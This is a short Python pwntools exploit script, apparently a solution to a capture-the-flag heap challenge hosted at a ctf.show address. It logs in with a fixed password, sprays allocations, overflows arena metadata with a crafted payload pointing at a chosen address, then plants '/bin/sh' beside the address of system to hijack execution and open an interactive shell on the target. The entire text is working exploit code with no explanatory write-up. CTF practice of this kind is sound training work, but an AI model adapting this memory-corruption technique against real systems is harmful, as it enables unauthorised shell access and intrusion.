from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
#io = remote('127.0.0.1',10000)
io = remote('pwn.challenge.ctf.show',28293)
elf = ELF('./pwn')
system_plt = elf.plt['system']
io.sendlineafter('password:',"WTF Arena has a secret!")
    
def add(size,n,content=''):
    io.sendlineafter('Action:','1')
    io.sendlineafter('Size:',str(size))
    io.sendlineafter('Pad blocks:',str(n))
    if content == '':
        io.sendlineafter('Content? (0/1):','0')
    else:
        io.sendlineafter('Content? (0/1):','1')
        io.sendafter('Input:',content)
    
for i in range(12):
    add(0x4000,1000)
    
add(0x4000,262,'0'*0x3FF0)
payload = '1'*0x50 + p32(0) + p32(3) + 10*p64(0x60201d)
sleep(0.2)
io.send(payload)
sleep(0.2)
payload = '/bin/sh'.ljust(0xB,'\x00') + p64(system_plt)
payload = payload.ljust(0x60,'b')
add(0x60,0,payload)
io.interactive()
